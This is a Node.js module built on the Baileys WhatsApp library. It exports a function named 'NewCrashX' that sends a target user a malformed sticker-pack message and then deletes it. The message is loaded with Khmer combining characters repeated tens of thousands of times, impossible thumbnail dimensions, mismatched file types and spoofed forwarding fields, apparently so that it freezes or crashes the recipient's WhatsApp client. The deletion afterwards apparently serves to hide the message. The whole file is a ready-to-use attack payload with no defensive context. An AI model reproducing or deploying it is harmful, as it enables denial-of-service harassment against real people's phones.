const crypto = require("crypto");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

async function NewCrashX(target, mention) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId:
              "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
            name: `༽ 𝐇𝐀𝐃𝐄𝐒 𝐈𝐍 𝐘𝐎𝐔𝐑 𝐀𝐑𝐄𝐀 ༼` + "ោ៝".repeat(30000),
            publisher:
              `༽ 𝐇𝐀𝐃𝐄𝐒 𝐈𝐍 𝐘𝐎𝐔𝐑 𝐀𝐑𝐄𝐀 ༼༑ ▾ ` + "ោ៝".repeat(30000),
            caption: "༽ 𝐇𝐀𝐃𝐄𝐒 𝐈𝐍 𝐘𝐎𝐔𝐑 𝐀𝐑𝐄𝐀 ༼ ▾ ",
            stickers: [
              {
                fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
                isAnimated: true,
                emojis: ["👾", "🩸"],
                accessibilityLabel: "@tamainfinity",
                stickerSentTs: "who know's ?",
                isAvatar: true,
                isAiSticker: true,
                isLottie: true,
                mimetype: "application/pdf",
              },
              {
                fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
                isAnimated: false,
                emojis: ["🩸", "👾"],
                accessibilityLabel: "@tamainfinity_",
                stickerSentTs: "who know's ?",
                isAvatar: true,
                isAiSticker: true,
                isLottie: true,
                mimetype: "application/pdf",
              },
            ],
            fileLength: "728050",
            fileSha256: "jhdqeybzxe/pXEAT4BZ1Vq01NuHF1A4cR9BMBTzsLoM=",
            fileEncSha256: "+medG1NodVaMozb3qCx9NbGx7U3jq37tEcZKBcgcGyw=",
            mediaKey: "Wvlvtt7qAw5K9QIRjVR/vVStGPEprPr32jac0fig/Q0=",
            directPath:
              "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              dataSharingContext: {
                showMmDisclosure: true,
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "REJECTED",
                  durationSecs: "1",
                  callType: "VOICE_CHAT",
                  participants: [
                    { jid: target, callOutcome: "CONNECTED" },
                    { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
                  ],
                },
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: true,
                id: "9741OURQ",
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
              forwardedNewsletterMessageInfo: {
                newsletterName:
                  "༽ 𝐇𝐀𝐃𝐄𝐒 𝐈𝐍 𝐘𝐎𝐔𝐑 𝐀𝐑𝐄𝐀 ༼༑ ▾ " + "ោ៝".repeat(10),
                newsletterJid: "120363321780343299@newsletter",
                serverMessageId: 1,
              },
              externalAdReply: {
                showAdAttribution: true,
                thumbnailUrl: null,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
            packDescription:
              "༽ 𝐇𝐀𝐃𝐄𝐒 𝐈𝐍 𝐘𝐎𝐔𝐑 𝐀𝐑𝐄𝐀 ༼ ▾ " + "ោ៝".repeat(100000),
            jpegThumbnail: null,
            mediaKeyTimestamp: "1736088676",
            trayIconFileName:
              "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
            thumbnailDirectPath:
              "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
            thumbnailSha256: "FQFP03spSHOSBUTOJkQg/phVS1I0YqtoqE8DoFZ/cmw=",
            thumbnailEncSha256: "OALtE35ViGAkU7DROBsJ1RK1dgma/dLcjpvUg62Mj8c=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 999999999,
            imageDataHash:
              "c6a15de8c2d205c6b1b344476f5f1af69394a9698ed1f60cb0e912fb6a9201c4",
            stickerPackSize: "723949",
            stickerPackOrigin: "THIRD_PARTY",
          },
        },
      },
    },
    { userJid: target }
  );
  await RyuuBotz.sendMessage(target, msg.message, {
    participant: { jid: target, messageId: msg.key.id },
  });
  await RyuuBotz.sendMessage(target, {
    delete: msg.key // hapus pesan yang baru dikirim
  });
}

module.exports = NewCrashX